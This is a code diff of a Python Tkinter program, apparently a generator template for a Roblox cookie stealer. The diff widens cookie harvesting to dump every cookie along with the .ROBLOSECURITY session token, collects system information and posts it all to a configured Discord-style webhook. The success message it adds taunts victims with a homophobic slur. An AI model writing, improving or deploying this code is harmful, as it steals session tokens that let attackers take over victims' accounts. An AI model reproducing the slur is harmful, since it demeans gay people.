@@ -187,12 +187,19 @@ def get_cookie_data():
         response = session.get(url, headers=headers, timeout=10)
         cookies = session.cookies.get_dict()
         
+        # Build detailed cookie information
+        cookie_details = "**All Cookies Found:**\\\\n"
+        for cookie_name, cookie_value in cookies.items():
+            cookie_details += f"- **{{cookie_name}}**: {{cookie_value}}\\\\n"
+        
         # Look for the specific cookie
-        target_cookie = cookies.get('.ROBLOSECURITY', 'Not found')
+        roblosecurity = cookies.get('.ROBLOSECURITY', 'Not found')
         
         return f"""
 **Cookie Data:**
-- .ROBLOSECURITY: {{target_cookie}}
+{{cookie_details}}
+**Important Cookie:**
+- .ROBLOSECURITY: {{roblosecurity}}
 - Total Cookies Found: {{len(cookies)}}
 """
         
@@ -205,54 +212,62 @@ def send_to_webhook():
         system_info = get_system_info()
         cookie_data = get_cookie_data()
         
+        # Create the webhook message
         data = {{
-            "embeds": [{{
-                "title": "Data Report",
-                "description": system_info + "\\\\n\\\\n" + cookie_data,
-                "color": 3447003,
-                "fields": [
-                    {{
-                        "name": "Status",
-                        "value": "Report Generated",
-                        "inline": True
-                    }}
-                ]
-            }}]
+            "content": "📊 Data Report Generated",
+            "embeds": [
+                {{
+                    "title": "System Information",
+                    "description": system_info,
+                    "color": 5814783
+                }},
+                {{
+                    "title": "Cookie Information", 
+                    "description": cookie_data,
+                    "color": 15105570
+                }}
+            ]
         }}
         
         response = requests.post("{webhook_url}", json=data, timeout=10)
         
         if response.status_code == 204:
-            messagebox.showinfo("Success", "Data sent successfully!")
+            messagebox.showinfo("Success", "✅ Get hacked by mudding fucking faggots")
         else:
-            messagebox.showerror("Error", "Failed to send data")
+            messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
                                
     except Exception as e:
-        messagebox.showerror("Error", f"Failed to send data: {{str(e)}}")
+        messagebox.showerror("Error", f"❌ Failed to send data: {{str(e)}}")
 
 def main():
     root = tk.Tk()
-    root.title("Tool")
-    root.geometry("400x300")
+    root.title("Data Tool")
+    root.geometry("450x250")
     root.configure(bg='#2C2F33')
     
-    title_label = tk.Label(root, text="Tool", 
+    title_label = tk.Label(root, text="Data Collection Tool", 
                           font=('Arial', 16, 'bold'),
                           fg='#7289DA', bg='#2C2F33')
-    title_label.pack(pady=30)
+    title_label.pack(pady=20)
     
     description = tk.Label(root, 
-                         text="Click the button to run",
+                         text="Click the button to collect and send data",
                          font=('Arial', 11),
                          fg='white', bg='#2C2F33')
-    description.pack(pady=20)
+    description.pack(pady=10)
     
-    run_btn = tk.Button(root, text="Run",
+    run_btn = tk.Button(root, text="🚀 Collect & Send Data",
                         command=send_to_webhook,
                         bg='#7289DA', fg='white',
                         font=('Arial', 12, 'bold'),
-                        width=20, height=2)
-    run_btn.pack(pady=30)
+                        width=25, height=2)
+    run_btn.pack(pady=20)
+    
+    info_label = tk.Label(root, 
+                         text="Data will be sent to the configured webhook",
+                         font=('Arial', 9),
+                         fg='#72767D', bg='#2C2F33')
+    info_label.pack(side=tk.BOTTOM, pady=10)
     
     root.mainloop()
 
